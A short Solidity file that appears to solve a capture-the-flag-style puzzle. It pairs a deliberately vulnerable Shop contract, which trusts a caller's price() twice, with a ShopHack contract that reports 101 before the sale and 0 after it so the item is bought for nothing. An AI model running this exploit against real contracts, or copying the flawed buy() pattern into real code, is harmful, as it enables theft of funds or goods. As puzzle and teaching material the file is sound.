// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract ShopHack is Buyer {
    Shop shop;
    bool called = false;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 101;
        }
    }

    function hack() external {
        shop.buy();
    }
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
